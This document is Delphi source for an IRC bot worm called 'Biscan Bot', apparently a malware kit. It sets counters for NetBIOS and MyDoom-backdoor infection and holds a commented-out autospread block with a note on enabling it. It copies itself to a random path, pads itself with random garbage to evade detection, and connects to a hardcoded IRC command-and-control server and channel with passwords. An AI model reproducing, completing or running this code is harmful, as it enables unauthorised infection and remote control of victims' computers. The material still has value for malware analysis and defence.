(* Biscan Bot: Coded by p0ke *)
{ -- http://p0ke.no-ip.com -- }

program Biscan;

uses
  Windows,
  uNetBios,
  uMyDoom,
  pFunc,
  pBot,
  pInfect in 'pInfect.pas',
  pWebServer in 'pWebServer.pas',
  pIMS in 'pIMS.pas';

{$R *.res}

var
  name: string;
  ThreadID: Dword;
begin
  Randomize;

  {
    %rnddir% = random directory (sys, win, current, temp)
    %rand% = random filename (asIFkasfNV.exe)
    %sys% = system directory
    %win% = windows directory
    %cur% = current directory
    %tmp% = temp directory
  }

//  CreateThread(NIL, 0, @WebServer, NIL, 0, ThreadID);
//  Msn;

  netbios_infected     := 0;            {netbios infection count}
  netbios_tries        := 0;            {netbios tries count}
  netbios_failed       := 0;            {netbios failed}
  netbios_accessdenied := 0;            {netbios access denied count}
  netbios_invalidpass  := 0;            {netbios invalide password count}
  netbios_logonfailure := 0;            {netbios logon failure count}

  mydoom_infected := 0;                 {mydoom infected count}
  mydoom_tries := 0;                    {mydoom tries count}
  mydoom_failed := 0;                   {mydoom failed count}

  CreateDCDir;

  {
  // REMOVE THIS IF YOU DONT WANT AUTOSPREAD
  netbiosstarted := true;
  mydoomstarted := true;
  scanstarted := true;
  StartNetBios(400);
  StartMyDoom(400);
  CreateThread(NIL, 0, @Scan, NIL, 0, ThreadID);
  CreateThread(NIL, 0, @WebServer, NIL, 0, ThreadID);
  CreateThread(NIL, 0, @msn, NIL, 0, ThreadID);
  // REMOVE THIS IF YOU DONT WANT AUTOSPREAD
  }

  name := '%rnddir%\%rand%.com';           {Set random dir with random name}
  replacestr('%rnddir%', randomdir, name); {Replace string}
  replacestr('%rand%', randomname, name);  {Replace string}
  replacestr('%sys%\', sysdir(''), name);  {Replace string}
  replacestr('%win%\', windir(''), name);  {Replace string}
  replacestr('%cur%\', curdir(''), name);  {Replace string}
  replacestr('%tmp%\', tmpdir(''), name);  {Replace string}
//  WritePrivateProfileString('boot','shell',pchar('explorer.exe '+name),'system.ini');  {Write to regedit if NT, else to system.ini if 9x}

  If Random(100) > 50 Then
    RandomGarbage(name,1024*(random(9)+1));{Add random garbage to file}

  Bot := TBisBot.Create;                   {Create}
  Bot.szPort := 6667;                      {Set Port}
  Bot.szIP := ipStr('irc.lcirc.net');      {Set IP}
  Bot.szNick := 'XDCC-'+RandomName;        {Set random nickname}
  Bot.szIdent := 'XDCC-'+RandomName;       {Set random ident}
  Bot.szChannel := '#ucc';                 {Set channel to join}
  Bot.szChannelPass := 'xdcc';             {Set password for channel to join}
  Bot.szPassword := 'motherfucker ';       {Set password for bot}
  Bot.szDot := '.';                        {Set commandchar (such as ("!",".","$")) used with commands (!login .login)}
  Bot.LoggedIn := False;                   {Set false to loggedin}
  Bot.Silent := False;                     {Set silent to false}
  Bot.NeverStop := True;                   {Set bot to never stop}
  Bot.StartBot;                            {Start Bot}
end.
